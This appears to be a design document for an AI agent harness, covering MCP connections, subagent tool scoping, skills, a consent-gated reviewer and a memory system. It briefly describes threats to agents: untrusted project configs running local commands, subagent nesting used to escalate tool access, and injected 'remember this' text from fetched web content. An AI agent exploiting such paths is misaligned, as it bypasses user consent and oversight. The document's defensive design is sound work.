Project-level `mcp.json` is subject to the exact same workspace trust gate as project-level agents/skills/`CONTEXT.md` (§14, D17) — **this was the single most serious finding from review**: a project-level `mcp.json` with a `stdio` transport can specify an arbitrary local `command` to execute, and Rev. 1 had this auto-connecting on startup with zero confirmation. Concretely: connecting to any project-level MCP server now requires `workspace_trust.is_trusted(project_path)` to return `True` first — user-level `mcp.json` is unaffected (you authored it yourself) and continues to auto-connect as before.

### (Rev. 4) What actually shipped — v2, and two bugs in the design above

D22 said to re-verify the SDK at implementation time rather than trusting this document. That was
done, and it mattered: **`mcp` 2.0.0 shipped 2026-07-28**, before implementation started. The pin
is `mcp>=2.0,<3` and everything above describing v1 APIs is superseded by this subsection.

**API deltas (verified in hand against the installed package, not from docs):**

| v1 (above) | v2 (shipped) |
|---|---|
| `ClientSession(read, write)` + separate transport CM | `Client(server)` — one async CM taking a Transport, a URL string, or an in-process `MCPServer` |
| `.structuredContent` / `.isError` | `.structured_content` / `.is_error` (all fields snake_case) |
| `Tool.inputSchema` | `Tool.input_schema`, plus a new `.title` |
| `read_timeout_seconds: timedelta` | `read_timeout_seconds: float` |
| `McpError` | `MCPError`; protocol timeouts *raise* it (`-32001`) rather than returning in band |
| `httpx` / `httpx-sse` | `httpx2` (a second HTTP stack; `httpx` stays for anthropic/openai/ddgs) |
| — | `mode: ConnectMode = "auto"` probes `server/discover` and **falls back silently** to the legacy `initialize()` handshake, so it is the maximum-compatibility setting. Leave it alone. |

**Bug 1 — the file cannot be called `mcp/client.py`.** The project root is on `sys.path`, so a
top-level `mcp/` package shadows the installed SDK and `import mcp` inside it resolves to itself.
It ships as **`mcp_client/`**. This is the `logging.py` incident with a worse blast radius.

**Bug 2 — the `AsyncExitStack` shutdown design does not work.** Rev. 3 correctly says the stack
must live on the MCP loop, but the real constraint is stricter: **anyio binds cancel scopes to the
TASK**, and `run_coroutine_threadsafe()` creates a new task per call. Entering the stack in
`connect_all()` and closing it in `disconnect_all()` — exactly as sketched — dies with
`RuntimeError: Attempted to exit cancel scope in a different task than it was entered in`.
Reproduced against the real SDK before any production code was written.

The shipped shape is **one long-lived manager task** that enters every context, signals ready, then
parks on an event until shutdown, so the stack unwinds in the task that entered it. Per-call tasks
are unaffected. See `mcp_client/client.py`'s module docstring.

**Also found: D23's redaction claim was false.** "MCP output gets secret-redacted by the existing
layer with no change to it" held only for top-level strings. `structured_content` is arbitrary JSON
from a third-party server and arrives under `result` as a *dict*, which `check_output_policy()`
never scanned — so the output most likely to carry a leaked credential took the one unscanned path.
Fixed in `safety/policy_enforcement.py` (recursive, depth-bounded), not at the MCP boundary,
because the same hole applied to any tool returning nested data under a scanned key.

### Acceptance criteria

1. `MCPClient(server_configs).server_configs` is actually set and inspectable (regression test for C10).
2. `call_tool()` succeeds when called from a plain synchronous script, from inside a Textual worker thread, and from inside an already-running asyncio context — all three, since the bridge is specifically what makes context irrelevant.
3. A project-level `mcp.json` server does NOT connect until the project has been explicitly trusted; a user-level one connects without any trust check.
4. A hung/slow MCP server call times out at 180 seconds rather than blocking indefinitely.
5. An MCP tool name (`mcp__<server>__<tool>`) is correctly picked up by `_default_for_unknown_tool()` (§15) as allowed-by-default.
6. **(Rev. 3, D23) `call_tool()` returns a plain `dict`, never a `CallToolResult`** — asserted directly, plus an end-to-end check that a secret-shaped string in MCP output comes back redacted by the existing `check_output_policy()` layer, and that `isError: true` surfaces as `{"error": ...}` rather than raising.
7. **(Rev. 3) A connected session survives past `connect_all()` returning** — call a tool successfully some time after connection, which is the specific failure the `AsyncExitStack` design prevents and the naive `async with` version does not.
8. **(Rev. 3) `disconnect_all()` leaves no orphaned child processes** — spawn a stdio server, disconnect, assert the subprocess is reaped. Run it in the shutdown path the CLI and TUI actually use, not just in isolation.
9. **(Rev. 3, D22) `requirements.txt` pins `mcp` with an upper bound**, and the pinned version's client API matches the call shapes used in this section — re-verify at implementation time rather than trusting this document, since the version boundary was live when it was written.

---

## 18. Agent system — agent `.md` format + manager + subagent tool + per-agent scoping + intersection rule

### `AgentManager` (`agents/manager.py`)

Discovers agent `.md` files across all three tiers (§14), parses frontmatter into an agent definition, and exposes lookup by name. ~~Before this is built, verify `AgentManager` actually exposes every method §20 (subagent review) calls on it~~ — **SETTLED at §20's build.** The flagged mismatch was not real: §20 calls `get()`, `active_context()` and `system_prompt_for()`, all of which exist and none of which needed a signature change. See §20's "§18 AC3, closed".

### Subagent tool access: intersection, never union (fixes C6, locked in)

A subagent's effective `ToolContext.allowed_tools` is the **intersection** of its own declared `allowed_tools` and its parent's currently-active set — never a union. Without this, a restricted parent agent could spawn a permissively-declared subagent specifically to bypass its own restriction — a privilege-escalation path through nesting that would undermine "stricter wins" (§15) one hop removed. This applies uniformly regardless of whether the subagent is a built-in or project/user-defined one (per D18's reasoning: built-in agents are just pre-installed custom agents, not a separately-trusted code path).

### Subagent depth limiting (fixes C3, via the same mechanism as C6)

Rev. 1's `spawn_subagent` took a `depth: int = 0` parameter that `registry.dispatch()` could never actually populate (dispatch only ever passes `params`, parsed from the model's tool call — there was no path for an incremented depth value to reach a nested call at all). The fix is the same plumbing that fixes C6: **thread `ToolContext` itself through the spawn call**, with `subagent_depth` as a field on it (already present in §15's `ToolContext` dataclass), incremented by `spawn_subagent` each time it constructs a child context:

```python
# agents/subagent_tool.py
def run(params: dict, parent_context: ToolContext, max_depth: int = 2) -> dict:
    if parent_context.subagent_depth >= max_depth:
        return {"error": f"Maximum subagent nesting depth ({max_depth}) reached"}

    agent_def = agent_manager.get(params["agent_name"])
    child_allowed = (
        set(agent_def.allowed_tools) & (parent_context.allowed_tools or set(agent_def.allowed_tools))
    )
    child_context = ToolContext(
        allowed_tools=child_allowed,
        approval_overrides=agent_def.approval_overrides,
        subagent_depth=parent_context.subagent_depth + 1,
    )
    response = run_agent_conversation(
        user_goal=params["task"], model=agent_def.model, provider_name=agent_def.provider,
        allowed_tools=child_allowed,
    )
    return {"result": response.text}   # distilled, matching the pipeline's own "don't share raw" principle
```

`registry.dispatch()` needs to pass the CURRENT context through to any handler that declares a `parent_context` parameter — this is a signature-inspection concern for `dispatch()` to resolve when this is implemented (mirrors how tool handlers already vary in whether they take just `params` or more).

### Built-in agents requested during §16

Two wishlist items are agents, not TUI features, and land here:

- **`/grill-me`** — an agent that reads the current thread and surfaces what still needs a decision: ambiguities, unstated design choices, assumptions the work is resting on. Shaped like §20's reviewer (read distilled state, return a structured list), and like every other agent it runs through `RunAgentLoop` rather than getting its own LLM-calling path.
- **Goal mode** — a persistent objective, set once and folded into every subsequent turn's context so the agent stays oriented across a long session. **Decided: a persistent objective, not a rubric-graded iterate loop and not a loop-behaviour switch.** Needs thread-scoped state; `ConversationThread.extra_data` already exists. (It is no longer unused: §18 shipped goal mode into it via key-scoped `set_extra()`, so §23's todo list would coexist under its own key rather than owning the column.) The TUI renders it as a banner.

### Acceptance criteria

1. A subagent spawned by an agent restricted to `{read, web_search}` cannot access `shell` even if its own `.md` declares `allowed_tools: [shell]` — verified directly, not just asserted.
2. Nesting beyond `max_depth` returns a clear error rather than continuing to spawn.
3. `AgentManager`'s actual method surface is checked against every call site in §20 before §20 is considered complete.

### Built

Implemented; full decision record in DEVLOG §18, file contract in ARCHITECTURE.md §4.18. Deviations from the sketch above, all locked with the project owner before implementation:

- `spawn_subagent` receives its parent scope through `dispatch()` signature inspection — handlers declaring `parent_context` / `parent_run` receive them; the Rev. 1 `depth:` parameter and `allowed_tools=` kwarg never existed in code (§15 replaced the latter with `context=`). Generalised so §23's response-channel tools add a third injectable name without reopening `dispatch()`.
- `/agent <name>` is **session-scoped** (switch until `/agent default`); `/grill-me` runs one `continue_conversation` turn in the CURRENT thread; both register into §16's slash registry from `agents/tui_commands.py`. CLI unchanged (TUI-only commands, D12).
- Goal mode: persistent per-thread objective in `ConversationThread.extra_data`, written only by `/goal`, injected into every shell's prompt by `core.loop.with_goal()`, mirrored by a TUI `GoalBanner`.
- The §15–17 headless finalization landed here, widened from approval-only to callability per the owner: `schemas(callable_only=True)` drops approval-gated tools when no `permission_channel` exists, paired with a once-per-process WARNING naming them (no quiet invisibility).
- AC1/AC2 verified by `tests/test_agents.py` with revert-checks (union and disabled-filter both fail their tests). AC3: **verified at §20's build and closed** — §20's call sites are `get()`, `active_context()` and `system_prompt_for()`, all present, no mismatch.

---

## 19. Skill system — skill `.md` format + manager + activation + default skills — BUILT

**Unchanged from Rev. 1 in overall shape.** One resolved gap: Rev. 1 described a skill's `additional_tools` as merging into scope via "`ToolContext.allowed_tools` expansion **or** adding to the scoped registry" — presented as either/or without picking one, and the two have different semantics. Resolved by the same "stricter wins" principle as §15: **a skill can never grant a tool an active agent's `allowed_tools` has excluded.** The composition across however many layers happen to be active (global policy, the active agent, every currently-active skill) is: intersect every layer's allowed set; a tool is available only if every layer that expresses an opinion agrees. A skill's `additional_tools` only takes effect for tools the current agent (if any) hasn't already restricted away — it narrows what's *offered*, never widens past what's already been restricted.

### Default skills (D10)

Cybersecurity research, cryptography verification, proof writing, literature review — shipped as `skills/builtin/*.md`.

### Decisions record (K1–K7), added at build time

Two things forced decisions rather than transcription. **`additional_tools` could not do what its name said**, and **category folders** were requested during planning.

| # | Decision |
|---|---|
| **K1** | **Activation pins the skill's body into the system prompt** for every subsequent turn. `load_skill` already returns any body on request, so activation cannot be about *reading* one — a tool result is a single message that scrolls away and is subject to §21 compaction, while an activated skill governs the session. This is what gives `/skill` a purpose distinct from the tool. |
| **K2** | **`additional_tools` is a precondition, checked at activation, that does not block it.** See below. |
| **K3** | **`SkillManager` holds no state**; `activate`/`deactivate` take and return the active list, and the shell owns it. §25 demonstrated what "TUI-only" costs when a capability turns out to be needed elsewhere. |
| **K4** | **Recursive discovery for skills; category is metadata, not identity.** `skills/builtin/<category>/<skill>.md`, category derived from the folder. Names stay global, so `load_skill`, `/skill` and D18 are untouched and flat layouts keep working. Agents stay flat. |
| **K5** | **Activation is session-scoped and unpersisted**, matching `/agent` rather than `/goal`. |
| **K6** | **Active bodies are appended OUTSIDE `with_catalogs()`**, which feeds `pass_prompt()` — pinning inside it would inject a skill activated in a TUI chat session into all ten research passes. |
| **K7** | **Schemas need no mid-loop refresh.** Settles the Rev. 3 verification item below. |

### Why `additional_tools` was respecified

Rev. 1 described it as merging into scope; Rev. 4 resolved the composition as *intersection* ("stricter wins"). Both readings assume the field can add something. It cannot: `ToolContext.allowed_tools` is a **whitelist that narrows** — `None` means no opinion, a set restricts *to* that set. With no active agent everything globally allowed is already available; with one, AC1 forbids widening; a globally disabled tool is unreachable by D14 unconditionally. There is no configuration in which the field widens anything, so as a grant it is **inert in every case**.

It is therefore a **declaration of need**: `SkillManager.missing_tools()` checks each declared tool against the live `ToolContext` via `registry.is_allowed` — the same policy function that would refuse the call later — and `/skill` reports what is unavailable. Activation still succeeds, because a skill is often useful without an optional tool and refusing would make a restrictive agent silently un-pairable with half the catalog.

### Acceptance criteria

1. An active agent restricted to `{read}` plus an active skill wanting to add `shell` does NOT result in `shell` being available. ✓ — and the skill says so at activation rather than the model discovering it mid-turn.
2. Multiple simultaneously-active skills each adding different tools compose correctly (union of skill additions, still capped by the agent's restriction if one is active). ✓ **as a union of REQUIREMENTS** — this criterion's wording predates K2, and with additions impossible the thing that composes is what the skills need, each still capped by the agent's restriction.
3. *(added at build)* A skill activated in a chat session never appears in a research pass's system prompt (K6).
4. *(added at build)* Each shipped default declares only tools that are available under default config — a builtin reporting a missing tool on every activation would read as the feature being broken.

---

## 20. Subagent reviewing — opt-in post-pipeline review with consented correction — BUILT

**Materially expanded at build, by the project owner's decision.** Rev. 1 specified a read-only commentary stage: run a reviewer subagent over the finished run, record what it said. The owner's requirement was that the reviewer be able to **update incorrect information**, with **user consent for every change**. That turns a stage that could not affect anything into the only place in this codebase where a model's proposal can alter a finished run's output — which is where all the design work went.

### What changed from the Rev. 1 sketch, and why

**The reviewer reads more than `run.trace`.** Rev. 1's one line said the trace, and that was right for commentary: it is the audit log, and it was verified not to leak raw per-pass history. It cannot support *correction*. Trace is process log lines (`"Pass 2: extracted 14 claim(s)"`) describing what happened, not what was concluded, so nothing in it can be checked for truth. The reviewer now gets the annotated claims with their tiers, grounding and score breakdowns, the coverage gaps, the report, and the trace. Those are still the pipeline's own distilled outputs — the same artifacts a human reads — so "distill, don't share raw history" holds unchanged; no per-pass conversation thread is shared.

**The report is regenerated, not edited.** `final_report` was synthesised *from* the claims, so a correction that changes a claim and leaves the report alone produces one run with two artifacts that contradict each other. For a harness whose output is meant to be auditable, that is worse than either error alone.

### Decisions (V1–V9)

| # | Decision | Why |
|---|---|---|
| **V1** | The reviewer reads the distilled artifacts and proposes corrections to `Claim.final_text`, `Claim.confidence_tier`, or the synthesis | `run.trace` alone cannot support correction; the claims are still distilled, so the principle it was checked against is intact |
| **V2** | An accepted correction re-runs final synthesis; a review where everything was rejected does not | Nothing else keeps `report.md` and `02_claims.json` telling the same story. The re-synthesised report is **not** re-reviewed — that regress is cut deliberately |
| **V3** | The orchestrator invokes the stage; the shell supplies consent as data on a new `review=` parameter | The alternative — a post-pipeline stage each shell invokes, mirroring `write_run_artifacts` — is exactly the shape that produced this project's live asymmetry: that function had ONE production call site, so `/research` in the TUI wrote no output directory at all |
| **V4** | Three outcomes per finding — accept / reject / **refine with notes** — plus a reject-all-remaining escape | Refine is the case where the human knows something the reviewer missed. Reject-all is safe by construction because it only ever *declines*; the affordance that must not exist is the one that accepts in bulk |
| **V5** | Refine re-enters the **same reviewer thread** via `continue_conversation()`, scoped to that finding | §3's JSON-retry pattern reused — the one place this codebase already makes a model confront its own output. A stateless call loses why it proposed what it did, so a note can come back as the same error from another angle. A note about #3 must not silently redraft #7 |
| **V6** | No consent route ⇒ nothing is applied. The review still runs and still records | Mirrors §25's "headless means unable to ask". This is the property that keeps a *mutating* stage from widening the security stance |
| **V7** | The reviewer inherits the run's `RunAuthorization` unchanged — same grants, same provider, same `GrantBudget` **instance** | No new security axis. Its calls spend from the ceiling the launcher set and land in the same `granted_calls.json`. A rebuilt budget would silently raise that ceiling, which is §25's named failure mode |
| **V8** | No new `Claim` field and no new database column | A `Claim` field would be a fourth thing every `vars(c)` site must stay JSON-native for; a `PipelineRunRecord` column would break every existing database, because `create_all()` creates missing *tables* and never `ALTER`s. Provenance goes to `subagent_reviews` → `07_review.json`, one trace line per decision, and a `review_override` key inside the existing `score_breakdown` dict |
| **V9** | The TUI writes artifacts too | See V3. Fixing the asymmetry rather than moving the write into the orchestrator, which would trade it for the loss of the pipeline's freedom from filesystem side effects — load-bearing for testability and documented in `output_writer.py` |

### The distinction found at build: "requested" is not "can be asked"

`build_review_consent()` returns `None` when stdin is not a terminal — V6 by construction rather than by a check somewhere downstream. That makes the two facts separable and they must be separated: if the consent object alone enabled the stage, `--review` on a piped run would skip the review **entirely** and report nothing, on exactly the run the user asked to have checked. `run_deep_research_pipeline` therefore takes `subagent_review` (does it run) alongside `review` (can anyone be asked), with `None` falling back to `config.SUBAGENT_REVIEW` exactly as `ensemble_mode` does.

### The `synthesis` finding kind

A third kind beside `text` and `tier`, added because "the report overstates claim 4" has no correction target under claims-and-tiers-only: the claim is right, the prose is wrong. An accepted `synthesis` finding edits nothing — it appends a directive to the re-synthesis input, so the fix still travels through the same generation step every other correction does, rather than letting a model rewrite the report directly.

### Acceptance criteria

1. A run with `SUBAGENT_REVIEW` off and no consent route makes no reviewer call. ✓
2. A review with findings and **no consent route** leaves every claim and the report byte-identical, and still records the findings. ✓ (V6)
3. An accepted correction changes the claim **and** re-runs final synthesis from the corrected set; a fully-rejected review re-runs nothing. ✓ (V2 — both halves, since either alone passes against a version that always or never re-synthesises)
4. A refinement re-enters the reviewer's own thread and replaces only its own finding. ✓ (V5)
5. The reviewer's loop invocation carries the run's grants, provider and the *same* `GrantBudget` instance. ✓ (V7)
6. Both shells produce `/output/<run_id>/`, and `07_review.json` appears only on a reviewed run. ✓ (V9)
7. **`AgentManager`'s method surface matches every call site here** — §18's AC3, carried since Rev. 2 and now settled. ✓ See below.

### §18 AC3, closed

§18 could not resolve this against §20 because neither existed. §20's call sites are exactly three:

- `manager.get("pipeline-reviewer")`
- `manager.active_context(agent)` — depth 0, since the orchestrator is not running under a parent context
- `manager.system_prompt_for(agent, DEFAULT_SYSTEM_PROMPT)`

All three exist on `AgentManager` and none needed a signature change. **No mismatch.** The verification item is closed, not deferred.

### Built

Implemented; decision record in DEVLOG §20, file contracts in ARCHITECTURE.md. Two things landed alongside it because §20 was the first consumer that needed them:

- **`core/reasoning/json_retry.py`** — §3's malformed-JSON recovery, extracted from `orchestrator._run_pass_with_json_retry`, which hardcoded `run_deep_research_mode` as the first attempt and `pass_prompt(pass_id)` as the prompt to continue under. The reviewer is agent-shaped, so it needed the same recovery under a different prompt. The orchestrator's function keeps its name, signature and behaviour.
- **`authorization=` on `run_agent_conversation`** — the only public loop entry point that could not carry a `RunAuthorization`. §25 added it to the other two and stopped because nothing agent-shaped needed it yet. Passing it *and* `granted_tools` now raises rather than resolving silently.

---

## 21. Memory system — compaction, archive, thread-scoped pinning, user/project memory — BUILT (§21a + §21b + §21c)

**This section fully replaces Rev. 1's placeholder** (D16 originally called it a thin, deferrable truncation strategy). Discussion surfaced that this is, in substance, the long-term memory feature that was deliberately deferred at the very start of this project's build ("persistence yes, extracted long-term memory not yet") — it's arriving on schedule as the harness grows, not as scope creep.

### Design principle

Compaction should not destroy history. The existing `storage.py`/`MessageLog` schema already IS a permanent, append-only archive — nothing about it needs to change to serve as "the full record." What's missing is a *derived, computed view* of "what the agent sees this turn," layered on top of that archive, not a second independent copy of it (two independent writers of related data is exactly the shape of a real bug this project already found and fixed once — see ARCHITECTURE.md/DEVLOG.md §3.8).

### New table: `CompactionCheckpoint`

```python
class CompactionCheckpoint(SQLModel, table=True):
    thread_id: UUID
    summary_text: str
    covers_up_to_message_id: UUID   # everything in MessageLog through this id is represented by summary_text
    created_at: datetime
```

`ConversationMemory`'s "what does the agent see" computation: load the latest checkpoint for this thread (if any), synthesize it as a leading message, then load only the archive rows *after* `covers_up_to_message_id` verbatim. The archive (`MessageLog`) itself is never edited, reduced, or touched by compaction — full history stays intact and independently readable, which is what serves the "never lose old messages" requirement, using something that already exists rather than a new redundant store.

### Compaction is a built-in agent, not bespoke code

`agents/builtin/compactor.md` — summarizing an older segment of conversation is exactly the shape of an agent call (a system prompt, a task, a judgment-based output), so it runs through the exact same `RunAgentLoop` machinery as everything else, rather than needing its own one-off LLM-calling code path. This is also what gives the agent real autonomy over *what* to preserve, versus mechanical truncation, which can't exercise judgment at all.

### Hyperparameters: buffer, keep, strength

**(D27, locked) These are defaults, not settings.** Every value below is a starting point chosen to be reasonable, explicitly not claimed to be right, and overridable by the user without editing harness source. The architecture around them (buffer/keep/strength, objectively measurable ratio targets) is what's locked; the numbers are expected to move once there are real long threads to look at — the same posture `config.py` already takes toward `MAX_TOKEN_BUDGET`.

```python
# config.py additions -- DEFAULTS, overridable per D27 (see resolution order below)
COMPACTION_KEEP_RECENT_TOKENS = 4_000     # most recent tokens, always verbatim, never compacted
COMPACTION_BUFFER_TOKENS = 8_000          # compaction fires when context_used >= context_limit - buffer
COMPACTION_WARNING_MARGIN_TOKENS = 2_000  # warning fires this many tokens BEFORE the buffer threshold
COMPACTION_STRENGTH = 3                    # 1-5, maps to a target compression ratio, see below
COMPACTION_MAX_RETRIES = 2                 # bounded retry if the compactor misses its target ratio
```

**Resolution order**, reusing D19's existing settings split rather than inventing a mechanism: `config.py` default → user-level `~/.config/venastine/settings.json` → project-level `.venastine/settings.json` (trusted only, per D17) → per-invocation override (`/compact --strength 4` in the TUI, which applies to that one run and doesn't persist). Nearest wins, which is the same precedence the rest of the config system already uses, so there's nothing new to learn.

Three notes on making these settable rather than constant:

- **Validate and clamp on load.** `strength` outside 1–5, or a `buffer` larger than the model's whole context window, should be rejected with a clear message at load time, not produce incoherent trigger math at runtime. A project-level `settings.json` is content the user may not have authored (D17's whole premise), and while a hostile value here can't destroy anything — the `MessageLog` archive is never edited by compaction, which is exactly the property that makes this safe — an absurd `buffer` would force compaction constantly, and every compaction is a real LLM call the user pays for. Clamp to sane bounds and warn.
- **`COMPACTION_WARNING_MARGIN_TOKENS` is the one worth thinking about up front**, because it's the only one whose wrong value is not self-correcting: it decides whether the early warning arrives with enough room left to actually do something (pin a message, wrap up a thought, trigger `/compact` manually at a natural break). Too small and it's an alert with no time attached to it. It must also always be strictly smaller than `COMPACTION_BUFFER_TOKENS`, or the warning fires after the thing it's warning about — validate that relationship, don't just document it.
- **Surface the effective values.** A `/config` or startup line showing which values are in force and where each came from turns "compaction feels too aggressive" from a mystery into a one-line answer. Cheap now, and the alternative is debugging a number three files away from where it was set.

- **`keep`** — the most recent N tokens/messages always stay verbatim, matching the opencode-style pattern this is deliberately modeled on.
- **`buffer`** — headroom before the hard context limit; compaction fires at `context_used >= context_limit - buffer`.

**(Rev. 3) Where `context_limit` and `context_used` come from** — Rev. 2's Open Question 5, now specified, since nothing in the codebase provides either today.

`context_limit`: a `MODEL_CONTEXT_WINDOWS: dict[str, int]` lookup in `config.py`, keyed by model name, with a `DEFAULT_CONTEXT_WINDOW` fallback. Deliberately *not* a per-provider API query: `providers.json.example` ships a roster of fifteen providers, most reaching the same OpenAI-compatible path, and there is no uniform endpoint exposing context length across them — a query-based design would need fifteen adapters to avoid a fallback constant it would end up needing anyway. A static table is honest about being incomplete, and the entries that matter are the handful of models actually configured. **Log at WARNING on fallback** (`logging_setup.py` exists for this, per ROADMAP §1), because a wrong-by-default window means compaction fires at the wrong time in whichever direction the guess is wrong, and silent guessing is what turns a tuning problem into a mystery.

`context_used`: `ModelResponse.usage["input_tokens"]` from the most recent call already *is* the measured size of everything the model was sent — no estimator needed, and it comes from the provider rather than from a local tokenizer that would have to be right per model. This is exact but retrospective: it reflects the previous turn, so the check runs after a response and fires compaction before the *next* call. Before the first call of a resumed thread there is no measurement yet, which is the one place a rough character-based estimate is needed. **This is what makes D21 load-bearing rather than pedantic** — if streaming silently reports zero usage, `context_used` stays 0, compaction never fires, and the harness runs into a hard context-limit error from the provider instead. The token-budget stop condition and the compaction trigger fail together, from the same cause.
- **`strength` is an objectively measurable target, not a qualitative instruction** — this directly answers the concern that a purely qualitative dial ("be more aggressive") would behave differently across models with different summarization tendencies, which is true and not fixable by prompting harder. Strength 1 through 5 maps to a **target compression ratio** (e.g. roughly 40% / 25% / 15% / 10% / 5% of the original segment's token count) — a number that's checkable after the fact by literally counting the resulting summary's tokens, unlike a vibe. If the compactor's output misses the target range, send a corrective follow-up ("that summary is 60% of the original; target is 25%, tighten it") and retry, bounded by `COMPACTION_MAX_RETRIES` — structurally the same mechanism as ROADMAP §3's JSON-retry loop, checking a length constraint instead of JSON validity, rather than a new pattern invented from scratch. Qualitative guidance ("preserve key decisions and their rationale over exploratory dead-ends") still belongs in the compactor's prompt, shaping *what* survives within the budget — the budget itself just stays a hard, verifiable number.

### Visibility (no silent compaction, ever)

Both automatic and manual (user-triggered, e.g. `/compact` in the TUI) compaction show a visible marker inline — something like `— 47 earlier messages compacted into summary —` — consistent with this project's established "fail/act loudly, never silently" pattern (`credentials.py` raising rather than defaulting quietly, `get_thread` raising on an unknown id rather than starting empty). A separate early-warning notification ("older messages may be compacted soon") fires at the smaller `COMPACTION_WARNING_MARGIN_TOKENS` threshold, strictly before the buffer's own trigger point — same estimation logic as `buffer`, evaluated slightly earlier, no new machinery. No confirmation is required for either the warning or the compaction itself.

### Thread-scoped pinning: `pin` tool

```python
# new column on MessageLog
pinned: bool = Field(default=False)
```

`pin(message_ref)` flags a specific message (or the last N turns) as compaction-exempt within its own thread — the compactor simply skips pinned rows when deciding what to fold into a summary.

**(Rev. 3) `message_ref` has nothing to refer to yet, and that constrains the design.** `MessageLog.id` exists, but `get_session_history()` deliberately reconstructs a *provider-neutral shape* that omits it — `{"role", "content"}`, `{"role", "text", "tool_calls"}`, `{"role", "tool_call_id", "content"}`. The model therefore never sees a message id and cannot name one. `core/memory.py`'s docstring is explicit that the neutral shape is exactly what gets persisted and reconstructed, with no post-hoc reshaping on either side, so adding an `id` key is not a free change: `_messages_for_provider()` translates these dicts per provider, and an unexpected key reaching a provider payload is a wire-format error rather than a harmless extra field.

Two options, and the recommendation is the second:

- *Surface ids in the neutral shape.* Requires auditing all three provider translation branches to strip it before the wire. Enables precise pinning, at the cost of putting a persistence-layer concept into the provider-neutral contract the whole memory design is built on keeping clean.
- **Recommended: keep the model's interface ordinal, resolve to ids internally.** `pin(last_n: int = 1)` — "pin the last N turns" — needs no id, matches how the tool would realistically be used mid-conversation ("remember this bit"), and keeps `MessageLog.id` an implementation detail. `ConversationMemory` maps the ordinal to real row ids when it writes the `pinned` flag, since it alone knows the thread's ordering.

The same gap affects `CompactionCheckpoint.covers_up_to_message_id` from the other direction — that one is written by harness code rather than by the model, so it can use real ids freely, but **`get_session_history()` needs a new `after_message_id` parameter** to load only the uncompacted tail. Resolving "rows after X" means looking up X's `created_at` and filtering greater-than, since ordering is by timestamp rather than by an autoincrementing sequence; `created_at` has microsecond resolution so ties are unlikely, but the query should be `(created_at, id)`-ordered to be deterministic regardless. This is a real `storage.py` change beyond the new tables and column already listed in the Modified Files table.

### User/project-scoped durable memory: `remember` tool

```python
class UserMemory(SQLModel, table=True):
    id: UUID = Field(default_factory=uuid4, primary_key=True)
    content: str
    category: Optional[str] = None
    scope: str = "project"   # "project" | "global" -- LOCKED (D25), see below
    source_thread_id: UUID
    created_at: datetime
```

Injected as a third context tier alongside `CONTEXT.md`, gated the same way — an agent opts in via `use_memory: true` in its frontmatter, rather than every memory being force-fed into every conversation regardless of relevance.

**Scope default (D25, locked): `"project"`.** `remember(content, scope="global")` remains available per call and the model should be told in the tool description when to reach for it — durable *preferences* about how to work ("prefers concise answers", "wants tests written before implementation") are the global-shaped case, and facts about a specific codebase are not. A project-scoped memory is keyed to the same resolved project path the workspace-trust store uses (D17), so "which project" means one thing across the whole system rather than two.

**Approval (D26, locked): `remember` requires approval, `pin` does not.** Concretely, per D24 both need declared fields in both dataclasses:

```python
# config.py -- ToolPermissions
pin: bool = True
remember: bool = True

# config.py -- ToolApprovals
pin: bool = False
remember: bool = True     # durable, cross-session, invisible when it later takes effect
```

Two consequences worth stating rather than discovering:

1. **`remember()` cannot fire on headless paths, by construction.** §13 specifies that with no `permission_channel` (CLI, and every deep-research pipeline pass), anything requiring approval is denied by default. So research passes can't write durable memories. That is the right outcome — a ten-pass pipeline running unattended is exactly the context where an injected "remember this" from fetched web content would be most dangerous and least noticed — but it means the pipeline must not be designed to depend on `remember()` for carrying anything forward. It already has `PipelineContext` for that.
2. **If the prompt proves too frequent in practice, don't relax it — move it.** An approval prompt that fires often enough to be dismissed reflexively is worse than no prompt, because it launders consent. The fallback, if that happens, is the pattern §21 already uses for compaction: make it *visible and undoable* instead of gated — a `— remembered: "..." —` marker inline plus a `/forget` command — rather than dropping the gate and leaving the write silent. Same principle ("never silently do consequential things"), different mechanism.

### Also served by this machinery (requested during §16)

Both of these were asked for as TUI features and are really this section's:

- **Session summaries** — the same operation as compaction: an agent distilling a thread segment. `CompactionCheckpoint` and `agents/builtin/compactor.md` (this section) will be this -- neither exists yet, and `config_loader` warns that compaction settings are present but unimplemented; a user-facing summary is that machinery invoked deliberately rather than by a token threshold. Building it separately in §16 would have meant either duplicating the compactor or pre-empting it.
- **`/ref` cross-thread referencing** — user-initiated: a thread picker (§16 already has one, over `storage.list_threads()`), then the chosen thread's **distilled summary** injected into the current thread. **Decided: user-initiated rather than a model-callable search tool** — the user chooses what crosses, so nothing fetched in one thread can steer another without their say-so. It defers to here rather than to §16 because it needs something to inject, and the compactor is the summariser. Matches the project's "distill, don't share raw history" principle; a model-initiated `search_threads` remains possible later on top of the same retrieval, with an approval gate on D26's reasoning.

### Decisions record (M1–M10), added at build time

§21 was split at build time. **§21a (BUILT)** is compaction, the checkpoint, the
hyperparameters and `pin`. **§21b (BUILT)** is durable `remember` / `use_memory` /
`/memories` / `/forget`. **§21c (BUILT)** is `/ref` and session summaries — see M18–M21
below. Each is independently useful and
independently testable, and §21a is roughly §20-sized on its own.

Tracing this section against the code before writing any surfaced two holes in its
own acceptance criteria and one parameterization that could never fire. These are
the resolutions.

**M1 — Compaction defends the working set, not the context window.** The spec above
puts the trigger at `context_limit - buffer`. It cannot fire there. `core/loop.py`
counts input tokens *per call* and the prompt is resent on every step of a
tool-using turn, so `MAX_TOKEN_BUDGET` makes a turn unusable long before any modern
window: at ~2k of tool result per step, a 20k-token thread gets about 9 steps, a 50k
thread about 2, and a 100k thread exactly one response with no tool calls at all. A
window-derived threshold therefore sits at a size the thread can never reach in
working order. For compaction at threshold `T` to fire *and* leave `k` usable steps,
the budget must be roughly `k·T`.

So `COMPACTION_TRIGGER_TOKENS` is a working-set target (40k) largely independent of
the model, `MAX_TOKEN_BUDGET` rises from its self-described placeholder 100k to
250k, and `effective_compaction()` warns when a configured trigger leaves too little
headroom — the relationship validated rather than documented. `settings.json`'s
`compaction.buffer_tokens` is renamed `trigger_tokens` to match; the keys had been
inert since §14, so nothing depended on the old spelling.

This also defuses a risk this section flagged about itself: `MODEL_CONTEXT_WINDOWS`
survives only as the pipeline backstop's source, so a missing entry costs a mistimed
backstop rather than mistimed compaction.

**M2 — Re-derive from the archive; chain only as a bounded fallback.** The spec
never says whether a later compaction summarizes the originals or the previous
summary, and that — not the trigger height — is what governs fidelity. Re-deriving
means exactly one summarization step always sits between an original message and
what the model sees, however many times compaction has run, which is what makes an
early trigger free in fidelity terms rather than a tradeoff. `strategy: "chain"`
forces the constant-cost alternative, and re-derivation falls back to it (traced)
when the span outgrows a single call.

